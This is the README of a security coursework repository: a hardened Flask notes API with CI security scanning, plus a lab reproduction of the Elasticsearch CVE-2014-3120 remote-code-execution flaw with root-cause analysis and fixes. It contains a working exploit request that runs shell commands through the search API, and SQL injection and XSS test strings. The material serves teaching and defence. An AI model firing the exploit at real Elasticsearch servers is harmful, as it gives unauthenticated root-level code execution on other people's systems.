# Secure Notes API — Work 1

A small, deliberately hardened REST API in Python/Flask, a CI pipeline that runs
tests + SAST + SCA on every push, and a reproducible analysis of a real CVE
(**CVE-2014-3120**, Elasticsearch 1.1.1 dynamic-scripting RCE) including the fix
and the proof that the fix works.

---

## 1. What this project is

The API stores short notes and exposes them to authenticated users. It exists to
demonstrate the full security lifecycle required by the assignment:

| Stage | Where it lives |
| --- | --- |
| Secure design (OWASP Top 10 A01 / A03 / A07) | `app/` |
| Automated security checks in CI | `.github/workflows/ci.yml` |
| Reproducing a real CVE | `vulnerability/vulnerable/` |
| Root cause analysis | `vulnerability/README.md` |
| Patch + verification | `vulnerability/fixed/`, `vulnerability/run_demo.ps1` |

**Stack:** Python 3.11, Flask 3, SQLite, PyJWT (HS256), bcrypt, pytest, bandit,
pip-audit, GitHub Actions, Docker Compose + Vulhub.

---

## 2. Quick start

```bash
git clone https://github.com/mahaotian23320311/work1-secure-api.git
cd work1-secure-api

python -m venv .venv
source .venv/bin/activate          # Windows: .\.venv\Scripts\Activate.ps1
pip install -r requirements.txt -r requirements-dev.txt

export JWT_SECRET="$(python -c 'import secrets; print(secrets.token_hex(32))')"
python wsgi.py                     # http://127.0.0.1:5000
```

Demo users are seeded on first start: `alice / Alice-Passw0rd!` (admin) and
`bob / Bob-Passw0rd!` (user).

Run the tests and the scanners:

```bash
pytest -q
bandit -r app -x tests -ll
pip-audit -r requirements.txt
```

---

## 3. API reference

All endpoints speak JSON only. A request that does not declare
`Content-Type: application/json` on a write method is answered with `415`.

### `POST /auth/login`

```bash
curl -s -X POST http://127.0.0.1:5000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"Alice-Passw0rd!"}'
```

```json
{"access_token":"eyJhbGciOiJIUzI1NiIs...","token_type":"Bearer","expires_in":1800}
```

`401 invalid_credentials` for a wrong password **and** for an unknown user — the
response body and the timing are identical in both cases.

### `GET /api/data` *(authentication required)*

```bash
curl -s http://127.0.0.1:5000/api/data -H "Authorization: Bearer $TOKEN"
curl -s "http://127.0.0.1:5000/api/data?search=injection" -H "Authorization: Bearer $TOKEN"
```

```json
{"count":3,"items":[{"id":1,"title":"...","body":"...","author":"alice","created_at":"..."}]}
```

Without a token: `401 missing_token` and `WWW-Authenticate: Bearer realm="api"`.

### `GET /api/me` *(authentication required)*

```json
{"id":1,"username":"alice","role":"admin"}
```

### `POST /api/notes` *(authentication required)* — the self-chosen endpoint

Creates a note owned by the caller. `title` 1–120 chars, `body` 1–2000 chars,
control characters rejected.

```bash
curl -s -X POST http://127.0.0.1:5000/api/notes \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"title":"Shopping","body":"milk"}'
```

```json
{"id":4,"title":"Shopping","body":"milk","author":"alice","created_at":"2026-10-20T04:40:27+00:00"}
```

### `GET /api/notes/<id>` *(authentication required, owner or admin only)*

`403 forbidden` when user `bob` asks for a note owned by `alice`; `404` when the
note does not exist.

### `GET /health`

`{"status":"ok"}` — no authentication, no data.

---

## 4. Implemented security measures

### 4.1 SQL injection (A03:2021 — Injection)

**Root fix: every query is parameterised.** User input is bound to `?`
placeholders and sent to SQLite separately from the SQL text, so it can never be
parsed as syntax (`app/db.py`, `app/auth.py`, `app/api.py`).

```python
user = db.execute(
    "SELECT id, username, password_hash, role FROM users WHERE username = ?",
    (username,),
).fetchone()
```

Additional details that matter:

* No string formatting (`f"…{user}…"`, `%`, `.format`) appears anywhere near SQL.
* The `search` parameter is still bound **and** its `%` / `_` wildcards are
  escaped, so `?search=%` matches the literal `%` instead of dumping every row.
* Column names are never taken from user input, so there is no identifier
  injection surface either.
* `tests/test_security.py::test_sqli_in_search_returns_zero_rows_without_error`
  replays `' OR '1'='1`, `' UNION SELECT …`, `'; DROP TABLE users; --` and
  asserts `200` with `count: 0` — the payload is data, not a query.

### 4.2 XSS (A03:2021)

The API returns JSON, which is **not** automatically XSS-safe: clients routinely
take the JSON and put it into the DOM. `app/security.py::escape_deep` walks the
response and HTML-escapes every string, so a stored `<script>` leaves the API as
`&lt;script&gt;` and cannot execute at the sink.

Defence in depth on top of that:

* `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; base-uri 'none'`
* `X-Content-Type-Options: nosniff` (no content sniffing into HTML)
* `X-Frame-Options: DENY` (no clickjacking)
* JSON-only request bodies, so no HTML form can post into the API
* Input validation: control characters rejected, length caps on every field

Verified by `test_xss_payload_is_escaped_on_output`: posting
`<script>alert('xss')</script>` returns `&lt;script&gt;alert('xss')&lt;/script&gt;`.

### 4.3 Authentication (A07:2021)

* **Passwords are never stored in plaintext.** `bcrypt` with a per-password
  random salt and cost 12 (`app/security.py::hash_password`), so identical
  passwords produce different hashes and offline cracking is slow by design.
* **JWT on login.** HS256, with `iss`, `iat`, `nbf`, `exp` (30 min) and a unique
  `jti`. The secret comes from the environment; a random one is generated if it
  is missing, so a known dev secret can never leak into production.
* **`decode_token` accepts only HS256**, which defeats `alg: none` and
  algorithm-confusion forgeries, and `require`s `exp`, `iat`, `sub`, `iss`.
* **`token_required`** (`app/auth.py`) validates the header shape, verifies the
  signature/expiry/issuer, then **re-reads the user from the database** by
  `sub`. A deleted or downgraded account cannot keep using an old token.
* **No user enumeration:** unknown-user logins still run a bcrypt comparison
  against a dummy hash, and both failure paths return the same `401` body.
* **Uniform-error policy:** all responses are JSON with a machine-readable
  `code`; stack traces are logged, never returned (CWE-209).

### 4.4 Everything else

| Control | Implementation |
| --- | --- |
| Broken access control (A01) | `/api/data`, `/api/me`, `/api/notes` all behind `@token_required`; note reads check owner-or-admin |
| Input validation | type, length, empty and control-character checks on every field |
| Body size limit | `MAX_CONTENT_LENGTH = 64 KiB` → `413` |
| Error handling | `ApiError` + handlers for `HTTPException` and `Exception`; no tracebacks |
| Cache safety | `Cache-Control: no-store` on `/auth` and `/api` |
| Secrets | `.env.example` only; `.env` git-ignored; no secret in the repo |
| Dependencies | pinned ranges + `pip-audit` in CI |

---

## 5. CI/CD pipeline

`.github/workflows/ci.yml` runs on **every push** and **every pull request**:

| Job | Tool | What it does | Artifact |
| --- | --- | --- | --- |
| `test` | pytest | 25 tests incl. SQLi/XSS/expired-token/forgery cases | `reports/junit.xml` |
| `sast` | bandit | static analysis of `app/`, fails on medium+ | `reports/bandit.json` / `.txt` |
| `sca` | pip-audit | audits `requirements.txt` against the advisory database | `reports/pip-audit.json` |

The pipeline is a real gate: bandit and pip-audit are not wrapped in `|| true`
for their failing run, so a medium finding or a vulnerable dependency turns the
run red.

Local result of the same three steps (this is what the screenshots should show
in the Actions tab):

```
pytest:     25 passed
bandit:     No issues identified.  (Total lines of code: 503)
pip-audit:  No known vulnerabilities found
```

**Screenshots to attach** (open *Actions → latest run → job → step*):
1. The green run overview with all three jobs.
2. `sast` job log showing `No issues identified`.
3. `sca` job log showing `No known vulnerabilities found`.
4. Artifacts section with `bandit-report` and `pip-audit-report`.

---

## 6. Reproducing CVE-2014-3120 (Vulhub)

Selected vulnerability: **CVE-2014-3120 — remote code execution through
Elasticsearch's dynamic scripting**, unauthenticated in the default
configuration of Elasticsearch < 1.2.0. CVSS 3.1: 8.1 (HIGH), CWE-284; it is on
the CISA KEV list (added 2022-03-25) because it is exploited in the wild.
Environment taken from `vulhub/elasticsearch/CVE-2014-3120` and kept in
`vulnerability/vulnerable/`.

Prerequisite: Docker with Docker Compose.

```bash
cd vulnerability/vulnerable
docker compose up -d
curl -s http://127.0.0.1:9200/          # "number" : "1.1.1"
```

### Attack 1 — put one document in an index

```bash
curl -s -XPUT 'http://127.0.0.1:9200/blog/post/1' \
     -H 'Content-Type: application/json' -d '{"title":"hello"}'
curl -s -XPOST 'http://127.0.0.1:9200/blog/_refresh'
```

### Attack 2 — make the search API run Java

```bash
curl -s -XPOST 'http://127.0.0.1:9200/_search' \
  -H 'Content-Type: application/json' -d '{
    "size":1,"query":{"match_all":{}},
    "script_fields":{"pwn":{"script":"java.lang.Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",\"id > /tmp/pwned.txt\"})"}}
  }'
```

Expected: `HTTP 200` and, inside the hit list, `"pwn":["java.lang.UNIXProcess@…"]`
— the string form of a running process. The command itself is visible in the
container:

```bash
docker compose exec -T es cat /tmp/pwned.txt
# uid=0(root) gid=0(root) groups=0(root)
```

`vulnerability/run_demo.ps1 -Phase all` automates all three scenarios, asserts
the expected outcome of each and writes `reports/cve-2014-3120-all.log`.

---

## 7. Root cause analysis

Elasticsearch exposes a scripting subsystem: a search request may carry a
script, and the node compiles and evaluates it **inside its own JVM**. This is a
feature — `script_fields` computes values at query time — but before 1.2 the
default policy left it open to anyone who could reach the port:

1. **`script.disable_dynamic` defaulted to `false`.** Every script arriving in a
   request body was compiled and executed. The only thing between an attacker
   and `Runtime.getRuntime()` was the JSON parser.
2. **No sandbox.** In 1.0/1.1 the MVEL expression is evaluated with full Java
   reflection, so `java.lang.Runtime` is reachable directly. A scripting engine
   without a class filter is `eval()` for Java.
3. **No authentication.** Elasticsearch 1.x had no users, roles or TLS, and the
   image binds `0.0.0.0`. The CVSS vector says `PR:L` because the vendor treats
   the API as privileged; on the network there is no credential at all, which is
   why this is effectively unauthenticated RCE.
4. **Blast radius.** The node runs as root in this image, so the first command
   is already root-level: read the data directory, reach the network, or abuse
   the heap.

The defect is therefore an **access-control failure around a dangerous
capability** (CWE-284): code evaluation was treated as an ordinary data field.
Every later fix is a way of taking that capability away from the client.

Full write-up: [`vulnerability/README.md`](vulnerability/README.md).

---

## 8. The fix and the proof

Three layers, weakest to strongest:

1. **Configuration (mitigation)** — `script.disable_dynamic: true` on the
   vulnerable 1.1.1 image (`vulnerability/hardened/`). The node refuses to
   compile scripts from a request; the search returns
   `ScriptException[dynamic scripting disabled]`.
2. **Patch (upgrade)** — Elasticsearch 1.4.4 (`vulnerability/fixed/`), where
   dynamic scripting has been off by default since 1.2 and a Groovy sandbox
   filters classes.
3. **Design** — do not expose the scripting API to clients at all: network ACL,
   a proxy that rejects `script`/`source` fields, or Elasticsearch ≥ 2.0 where
   dynamic scripting was removed.

```dockerfile
# hardened/
FROM vulhub/elasticsearch:1.1.1
RUN echo "script.disable_dynamic: true" >> /usr/share/elasticsearch/config/elasticsearch.yml

# fixed/
FROM vulhub/elasticsearch:1.4.4
```

### Measured result

| Scenario | `version.number` | Attack | `/tmp/pwned.txt` | Normal search |
| --- | --- | --- | --- | --- |
| `vulnerable/` — dynamic scripting on | 1.1.1 | **200**, `java.lang.UNIXProcess@…` | **`uid=0(root)`** | 1 hit |
| `hardened/` — `script.disable_dynamic: true` | 1.1.1 | **400**, `dynamic scripting disabled` | absent | 1 hit |
| `fixed/` — upgraded | 1.4.4 | **400**, `dynamic scripting for [groovy] disabled` | absent | 1 hit |

After the fix the attack is rejected, nothing is executed, and the same
document is still searchable — the regression check proves the remediation did
not break the service.

A nuance worth keeping: **1.4.4 is not the end of the story.** It fixed this
CVE, but in 2015 the 1.4.x sandbox was bypassed again (CVE-2015-1427, Groovy
sandbox escape), and 1.4.4 is still inside that affected range. That is why the
strongest layer above is the design one: "no client-supplied scripts" survives
the next clever expression, while a sandbox has to be perfect every time.

```powershell
powershell -NoProfile -File vulnerability\run_demo.ps1 -Phase all
```

---

## 9. Repository layout

```
work1-secure-api/
├── app/
│   ├── __init__.py        # factory, security headers, error handlers
│   ├── auth.py            # /auth/login + token_required
│   ├── api.py             # /api/data, /api/me, /api/notes
│   ├── security.py        # bcrypt, JWT, escape_deep, input cleaning
│   ├── db.py              # parameterised SQLite layer + schema
│   ├── errors.py          # uniform JSON errors
│   └── config.py          # env-driven configuration
├── tests/                 # 25 pytest tests, incl. attack payloads
├── .github/workflows/ci.yml
├── vulnerability/
│   ├── README.md          # CVE analysis, step by step
│   ├── vulnerable/        # Elasticsearch 1.1.1, dynamic scripting on
│   ├── hardened/          # 1.1.1 + script.disable_dynamic (isolates the config layer)
│   ├── fixed/             # 1.4.4, dynamic scripting off by default
│   ├── run_demo.ps1       # three-phase attack -> verify, writes reports/*.log
│   └── run_demo.sh
├── scripts/live_demo.ps1  # curl walkthrough of the API
├── reports/               # pytest / bandit / pip-audit / curl transcripts
├── docs/                  # report + step-by-step guide
└── wsgi.py
```

---

## 10. Evidence collected in this repository

| File | Content |
| --- | --- |
| `reports/curl-transcript.txt` | 9 curl exchanges: 401 without token, JWT issued, 401 on bad password, 200 with token, SQLi payload → 0 rows, XSS escaped, 401 on garbage token, security headers |
| `reports/cve-2014-3120-all.log` | `run_demo.ps1 -Phase all`: RCE succeeds on 1.1.1 (`uid=0(root)`), is rejected on the hardened image and on 1.4.4, normal search still works in all three |
| `reports/junit.xml` | pytest results |
| `reports/bandit.txt` / `.json` | bandit report (no issues) |
| `reports/pip-audit.json` | dependency audit (no known vulnerabilities) |

The curl and CVE transcripts are generated by scripts in the repository
(`scripts/live_demo.ps1`, `vulnerability/run_demo.ps1`), so every claim can be
re-produced instead of being a static screenshot.
